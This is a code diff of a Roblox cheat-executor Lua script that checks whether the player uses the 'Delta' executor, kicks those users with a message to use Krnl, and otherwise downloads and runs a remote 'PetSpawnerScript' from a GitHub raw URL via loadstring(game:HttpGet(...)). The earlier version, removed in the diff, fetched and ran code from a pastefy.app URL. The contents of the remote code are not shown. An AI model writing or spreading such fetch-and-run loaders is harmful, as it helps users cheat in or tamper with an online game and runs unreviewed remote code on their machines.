@@ -1,5 +1,23 @@
-if identifyexecutor and string.lower(identifyexecutor()) == "delta" then
-    game.Players.LocalPlayer:Kick("Delta Not Supported. Please Use Krnl.")
-else
-    loadstring(game:HttpGet("https://pastefy.app/2FCbYbjz/raw"))()
+-- Safe executor detection
+local function getExecutorName()
+    local exec = ""
+    if identifyexecutor then
+        pcall(function()
+            exec = string.lower(identifyexecutor())
+        end)
+    end
+    return exec
 end
+
+-- Delta detection logic
+local exec = getExecutorName()
+local isDelta = exec:find("delta") ~= nil or _G.Delta_Executor or (isexecutorclosure and tostring(isexecutorclosure):lower():find("delta"))
+
+-- Kick if Delta
+if isDelta then
+    game.Players.LocalPlayer:Kick("Delta Not Supported. Please Use Krnl.")
+    return
+end
+
+-- Load your actual script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PetSpawnerScript-bit/PetSpawnerscript./refs/heads/main/PetSpawnerScript"))()
